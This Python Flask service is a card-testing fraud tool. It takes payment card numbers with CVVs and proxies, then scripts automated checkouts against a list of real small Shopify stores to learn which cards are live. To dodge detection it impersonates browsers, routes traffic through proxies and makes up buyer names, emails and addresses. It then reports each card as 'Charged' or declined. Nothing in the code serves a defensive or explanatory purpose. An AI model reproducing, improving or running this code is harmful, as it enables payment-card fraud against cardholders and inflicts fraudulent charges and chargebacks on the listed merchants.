import os
import random
import re
import html
import string
import uuid
import time
import json
import urllib3
from flask import Flask, request, jsonify
from curl_cffi import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# ==========================================
# 🏪 YOUR STORES (COPIED FROM YOUR CSV)
# ==========================================
STORES = [
    {"shop_url": "https://klubfiller.myshopify.com", "variant_id": "49321449652532", "product_url": "https://klubfiller.myshopify.com/products/klubfiller-waiting-for-tonight"},
    {"shop_url": "https://thats-what-che-said.myshopify.com", "variant_id": "39849766846546", "product_url": "https://thats-what-che-said.myshopify.com/products/coffee-before-wordle"},
    {"shop_url": "https://the-brush-lettering-club.myshopify.com", "variant_id": "58864569811325", "product_url": "https://the-brush-lettering-club.myshopify.com/products/love-brush-lettering-practice-sheet"},
    {"shop_url": "https://loveathomeeducation.myshopify.com", "variant_id": "49260930990270", "product_url": "https://loveathomeeducation.myshopify.com/products/ms-frizzle-earth-science-addition-8-units-pre-sale"},
    {"shop_url": "https://the-coloring-project.myshopify.com", "variant_id": "51956110360864", "product_url": "https://the-coloring-project.myshopify.com/products/beautiful-noise-inspired-single-coloring-page-i-am-i-said"},
    {"shop_url": "https://leemo-designs.myshopify.com", "variant_id": "39969683538014", "product_url": "https://leemo-designs.myshopify.com/products/digital-download-printable-daily-planner"},
    {"shop_url": "https://math-giraffe-shop.myshopify.com", "variant_id": "43428300390612", "product_url": "https://math-giraffe-shop.myshopify.com/products/inductive-vs-deductive-reasoning-doodle-notes"},
    {"shop_url": "https://swirly-shop-6926.myshopify.com", "variant_id": "53010324652341", "product_url": "https://swirly-shop-6926.myshopify.com/products/pomegranate-seed"},
    {"shop_url": "https://ks-original-shop.myshopify.com", "variant_id": "55776436093309", "product_url": "https://ks-original-shop.myshopify.com/products/lanyard-umhaengeband-mit-karabinerhaken-in-weiss"},
    {"shop_url": "https://trebuchet-magazine.myshopify.com", "variant_id": "39682457206850", "product_url": "https://trebuchet-magazine.myshopify.com/products/trebuchet-10-materials-ii-download"},
    {"shop_url": "https://lamaisontricotee.myshopify.com", "variant_id": "41101335920743", "product_url": "https://lamaisontricotee.myshopify.com/products/les-mitaines-carol"},
    {"shop_url": "https://customfavorzbysharon.myshopify.com", "variant_id": "45793769423018", "product_url": "https://customfavorzbysharon.myshopify.com/products/kids-juneteenth-shirt-png-1865-juneteenth-png-black-history-instant-download"},
    {"shop_url": "https://tjnicholsbooks.myshopify.com", "variant_id": "50151793656109", "product_url": "https://tjnicholsbooks.myshopify.com/products/minotaurs-and-other-magic-mytho-collapse-ebook"},
    {"shop_url": "https://lawn-chair.myshopify.com", "variant_id": "37472988135583", "product_url": "https://lawn-chair.myshopify.com/products/footlights-1"},
    {"shop_url": "https://kingsleylockwoodliterarybooks.myshopify.com", "variant_id": "51750254805299", "product_url": "https://kingsleylockwoodliterarybooks.myshopify.com/products/love-finds-the-way-ebook"},
    {"shop_url": "https://triplecrownjewelry.myshopify.com", "variant_id": "39656687403113", "product_url": "https://triplecrownjewelry.myshopify.com/products/__customized-items"},
    {"shop_url": "https://marklindsaymemorabilia.myshopify.com", "variant_id": "45847518019832", "product_url": "https://marklindsaymemorabilia.myshopify.com/products/blue-star"},
    {"shop_url": "https://trinity-valley-school.myshopify.com", "variant_id": "12175879176300", "product_url": "https://trinity-valley-school.myshopify.com/products/concessions-2"},
    {"shop_url": "https://dante-mazzetti-shop.myshopify.com", "variant_id": "40837271257220", "product_url": "https://dante-mazzetti-shop.myshopify.com/products/out-of-my-mind-digital-single"},
    {"shop_url": "https://mama-lisas-world.myshopify.com", "variant_id": "31890270650422", "product_url": "https://mama-lisas-world.myshopify.com/products/how-to-dye-eggs-naturally-easy-print-pack"},
]

# ==========================================
# 🎭 BROWSER PROFILES
# ==========================================
BROWSER_PROFILES = [
    {"impersonate": "chrome124", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"},
    {"impersonate": "chrome120", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"},
    {"impersonate": "chrome119", "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"},
]

def get_random_browser():
    return random.choice(BROWSER_PROFILES)

# ==========================================
# 🎭 IDENTITY DATA
# ==========================================
FIRST_NAMES = ["Luna", "Oliver", "Milo", "Bella", "Leo", "Chloe", "Max", "Lucy", "Simba", "Nala", "Charlie", "Daisy", "Jack", "Sophie", "James", "Mary", "Robert", "Patricia", "Emma", "Liam", "Noah", "Ava", "Isabella", "Mason", "Ethan", "Harper", "Elijah"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Wilson", "Taylor", "Anderson", "Thomas", "Jackson", "White", "Harris", "Martin", "Thompson", "Young", "Allen", "King", "Wright", "Scott", "Torres", "Nguyen"]
EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com", "icloud.com", "live.com"]

MATCHED_ADDRESSES = [
    {"street": "123 Avenue Mohammed V", "city": "Casablanca", "state": "Casablanca-Settat", "zip": "20000", "country": "MA"},
    {"street": "456 Avenue Hassan II", "city": "Rabat", "state": "Rabat-Salé-Kénitra", "zip": "10000", "country": "MA"},
    {"street": "789 Boulevard Zerktouni", "city": "Marrakech", "state": "Marrakech-Safi", "zip": "40000", "country": "MA"},
    {"street": "100 SW Main St", "city": "Portland", "state": "OR", "zip": "97204", "country": "US"},
    {"street": "223 Pioneer Blvd", "city": "Salem", "state": "OR", "zip": "97301", "country": "US"},
    {"street": "456 Oak St", "city": "Eugene", "state": "OR", "zip": "97401", "country": "US"},
]

def generate_random_identity(target_country="US"):
    fn = random.choice(FIRST_NAMES)
    ln = random.choice(LAST_NAMES)
    email = f"{fn.lower()}.{ln.lower()}{random.randint(1,9999)}@{random.choice(EMAIL_DOMAINS)}"
    
    valid_addresses = [addr for addr in MATCHED_ADDRESSES if addr.get("country", "US") == target_country]
    if not valid_addresses:
        valid_addresses = [addr for addr in MATCHED_ADDRESSES if addr.get("country", "US") == "US"]
        
    addr = random.choice(valid_addresses)
    return fn, ln, email, addr["street"], addr["city"], addr.get("state", ""), addr["zip"], addr.get("country", target_country)

def random_attempt_suffix(length=12):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def parse_card(card_str):
    parts = card_str.split("|")
    if len(parts) >= 4:
        ccn = parts[0].strip().replace(" ", "")
        mm = parts[1].strip()
        yy = parts[2].strip()
        cvv = parts[3].strip()
        yyyy = "20" + yy if len(yy) == 2 else yy
        return ccn, mm, yyyy, cvv
    return None

def parse_proxy(proxy_str):
    for scheme in ["socks5://", "socks5h://", "http://", "https://"]:
        if proxy_str.startswith(scheme): proxy_str = proxy_str[len(scheme):]
    parts = proxy_str.split(":")
    if len(parts) == 2: return f"socks5h://{parts[0]}:{parts[1]}"
    elif len(parts) >= 4:
        host, port, user = parts[0], parts[1], parts[2]
        pw = ":".join(parts[3:])
        return f"socks5h://{user}:{pw}@{host}:{port}"
    return f"socks5h://{proxy_str}"

def extract_session_token(html_text):
    def clean(raw):
        t = raw.strip()
        if t.startswith("&quot;"): t = t[6:]
        if t.endswith("&quot;"): t = t[:-6]
        return t.strip('"\'') if len(t) > 50 else None

    patterns = [
        r'name="serialized-sessionToken"\s+content="([^"]+)"',
        r'"X-Checkout-One-Session-Token"\s*:\s*"([^"]+)"',
        r'"sessionToken"\s*:\s*"([^"]+)"',
    ]
    for pat in patterns:
        m = re.search(pat, html_text)
        if m:
            token = clean(m.group(1))
            if token: return token
    return None

# ==========================================
# 🛒 CHECKOUT LOGIC (DIRECT VARIANT)
# ==========================================
def process_checkout(card_data, proxy_url, store):
    ccn, mm, yyyy, cvv = card_data
    SHOP_URL = store["shop_url"]
    VARIANT_ID = store["variant_id"]
    PRODUCT_URL = store["product_url"]
    
    browser_profile = get_random_browser()
    session = requests.Session(impersonate=browser_profile["impersonate"])
    current_ua = browser_profile["ua"]

    if proxy_url and proxy_url != "DIRECT":
        session.proxies = {"http": proxy_url, "https": proxy_url}

    try:
        # 1. ADD TO CART (Using the hardcoded variant ID)
        r = session.post(f"{SHOP_URL}/cart/add.js", headers={"accept": "application/json", "content-type": "application/json", "origin": SHOP_URL, "referer": PRODUCT_URL, "user-agent": current_ua}, json={"id": int(VARIANT_ID), "quantity": 1}, timeout=25)
        if r.status_code != 200 or "id" not in r.json():
            return {"Response": "CART_FAILED", "success": False}

        # 2. TRIGGER CHECKOUT
        r = session.post(f"{SHOP_URL}/cart", headers={"content-type": "application/x-www-form-urlencoded", "origin": SHOP_URL, "referer": PRODUCT_URL, "user-agent": current_ua}, data="checkout=", allow_redirects=False, timeout=25)
        if r.status_code not in [301, 302, 303, 307, 308]:
            return {"Response": "CHECKOUT_FAILED", "success": False}

        redirect_url = r.headers.get("Location")
        match = re.search(r"/cn/([^/]+)/", redirect_url)
        if not match: return {"Response": "NO_CART_TOKEN", "success": False}
        cart_token = match.group(1)

        real_checkout_url = f"{SHOP_URL}/checkouts/cn/{cart_token}/en-us?skip_shop_pay=true"

        # 3. GET CHECKOUT PAGE
        r = session.get(real_checkout_url, headers={"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "cache-control": "max-age=0", "user-agent": current_ua}, allow_redirects=True, timeout=25)
        clean_text = html.unescape(r.text)

        # Dynamic Country & Currency extraction
        country_match = re.search(r'"country"\s*:\s*\{\s*"code"\s*:\s*"([A-Z]{2})"', clean_text)
        dynamic_country_code = country_match.group(1) if country_match else "US"
        
        currency_match = re.search(r'"currencyCode"\s*:\s*"([A-Z]{3})"', clean_text)
        dynamic_currency_code = currency_match.group(1) if currency_match else "USD"
        
        total_match = re.search(r'"runningTotal"\s*:\s*\{\s*"value"\s*:\s*\{"amount"\s*:\s*"([\d.]+)"', clean_text)
        dynamic_amount = total_match.group(1) if total_match else "2.50"

        fn, ln, email, street, city, state, zipc, addr_country = generate_random_identity(dynamic_country_code)

        build_id = ""
        for pat in [r'"commitSha"\s*:\s*"([0-9a-f]{40})"', r'x-checkout-web-build-id["\s:]+([0-9a-f]{40})', r'"buildId"\s*:\s*"([0-9a-f]{40})"']:
            m = re.search(pat, clean_text)
            if m:
                build_id = m.group(1)
                break

        x_checkout_one_session_token = extract_session_token(clean_text) or ""
        
        queue_token = ""
        for pat in [r'"queueToken"\s*:\s*"([^"]+)"', r"queueToken['\"]?\s*:\s*['\"]([^'\"]{20,})['\"]"]:
            m = re.search(pat, clean_text)
            if m:
                queue_token = m.group(1)
                break

        stable_id = None
        for pat in [r'"stableId"\s*:\s*"([0-9a-f-]{36})"', r"stableId['\"]?\s*:\s*['\"]([0-9a-f-]{36})['\"]"]:
            m = re.search(pat, clean_text)
            if m:
                stable_id = m.group(1)
                break

        paymentMethodIdentifier = None
        for pat in [r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', r"paymentMethodIdentifier['\"]?\s*:\s*['\"]([^'\"]+)['\"]"]:
            m = re.search(pat, clean_text)
            if m:
                paymentMethodIdentifier = m.group(1)
                break

        if not stable_id:
            return {"Response": "MISSING_STABLE_ID", "success": False}

        # 4. PCI SESSION (Tokenize card)
        encoded_checkout_url = quote(real_checkout_url, safe="")
        pci_headers = {
            "accept": "application/json", "content-type": "application/json", "origin": "https://checkout.pci.shopifyinc.com",
            "referer": f"https://checkout.pci.shopifyinc.com/build/09497de/number-ltr.html?identifier=&locationURL={encoded_checkout_url}",
            "user-agent": current_ua,
        }
        pci_data = {
            "credit_card": {"number": ccn.replace(" ", ""), "month": int(mm), "year": int(yyyy), "verification_value": cvv, "name": f"{fn} {ln}"},
            "payment_session_scope": SHOP_URL.split("//")[1],
        }
        r_pci = session.post("https://checkout.pci.shopifyinc.com/sessions", headers=pci_headers, json=pci_data, timeout=25)
        session_id = r_pci.json().get("id")
        if not session_id: return {"Response": "PCI_FAILED", "success": False}

        # 5. SUBMIT
        submit_payload = {
            "variables": {
                "input": {
                    "sessionInput": {"sessionToken": x_checkout_one_session_token},
                    "queueToken": queue_token,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "selectedDeliveryStrategy": {"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}}, "options": {}},
                            "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                            "deliveryMethodTypes": ["NONE"], "expectedTotalPrice": {"any": True}, "destinationChanged": True
                        }],
                        "noDeliveryRequired": [], "useProgressiveRates": False, "supportsSplitShipping": True
                    },
                    "deliveryExpectations": {"deliveryExpectationLines": []},
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id,
                            "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{VARIANT_ID}", "variantId": f"gid://shopify/ProductVariant/{VARIANT_ID}", "properties": []}},
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"value": {"amount": str(dynamic_amount), "currencyCode": dynamic_currency_code}}
                        }]
                    },
                    "memberships": {"memberships": []},
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": paymentMethodIdentifier, "sessionId": session_id,
                                    "billingAddress": {"streetAddress": {"address1": street, "city": city, "countryCode": dynamic_country_code, "postalCode": zipc, "firstName": fn, "lastName": ln, "zoneCode": state, "phone": ""}},
                                    "cardSource": None
                                }
                            },
                            "amount": {"value": {"amount": str(dynamic_amount), "currencyCode": dynamic_currency_code}}
                        }],
                        "billingAddress": {"streetAddress": {"address1": street, "city": city, "countryCode": dynamic_country_code, "postalCode": zipc, "firstName": fn, "lastName": ln, "zoneCode": state, "phone": ""}},
                        "creditCardBin": ccn[:8], "allowStoreCredit": False
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": dynamic_currency_code, "countryCode": dynamic_country_code},
                        "email": email, "emailChanged": True, "phoneCountryCode": dynamic_country_code,
                        "marketingConsent": [{"email": {"consentState": "DECLINED", "value": email}}],
                        "shopPayOptInPhone": {"number": "", "countryCode": dynamic_country_code}, "rememberMe": False
                    },
                    "tip": {"tipLines": []},
                    "taxes": {"proposedTotalAmount": {"value": {"amount": "0", "currencyCode": dynamic_currency_code}}}
                },
                "attemptToken": f"{cart_token}-{random_attempt_suffix()}",
                "metafields": [],
                "analytics": {"requestUrl": real_checkout_url, "pageId": str(uuid.uuid4())}
            },
            "operationName": "SubmitForCompletion",
            "id": "b3fd8db496438a6859c96db264b77e84b3f093d11a44c4d0a84d43e661f12419"
        }

        r_submit = session.post(
            f"{SHOP_URL}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
            headers={"content-type": "application/json", "origin": SHOP_URL, "referer": real_checkout_url, "user-agent": current_ua, "x-checkout-one-session-token": x_checkout_one_session_token, "x-checkout-web-build-id": build_id},
            json=submit_payload, timeout=25
        )

        # 6. PARSE RESULT
        sfc = r_submit.json().get("data", {}).get("submitForCompletion", {})
        receipt = sfc.get("receipt", {})
        
        if receipt.get("__typename") == "FailedReceipt":
            err_code = receipt.get("processingError", {}).get("code", "CARD_DECLINED")
            return {"Response": err_code, "Price": f"{dynamic_amount} {dynamic_currency_code}", "Gate": "Shopify Payments", "success": False}
        elif receipt.get("__typename") in ("ProcessedReceipt", "ProcessingReceipt"):
            return {"Response": "ORDER_PLACED", "Charged": "True", "Approved": "True", "Price": f"{dynamic_amount} {dynamic_currency_code}", "Gate": "Shopify Payments", "success": True}

        return {"Response": "UNKNOWN_RESPONSE", "success": False}

    except Exception as e:
        return {"Response": f"ERROR_{str(e)[:20]}", "success": False}

# ==========================================
# 🌐 API ROUTES
# ==========================================
@app.route("/")
def check_card():
    card_str = request.args.get("card")
    proxy_str = request.args.get("proxy", "")

    if not card_str or not proxy_str:
        return jsonify({"Response": "MISSING_PARAMS", "success": False})

    card_data = parse_card(card_str)
    if not card_data:
        return jsonify({"Response": "INVALID_CARD", "success": False})

    store = random.choice(STORES)
    proxy_url = parse_proxy(proxy_str)

    result = process_checkout(card_data, proxy_url, store)
    return jsonify(result)

@app.route("/health")
def health():
    return jsonify({"workers_busy": 0, "workers_cap": 1000, "sites": len(STORES)})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
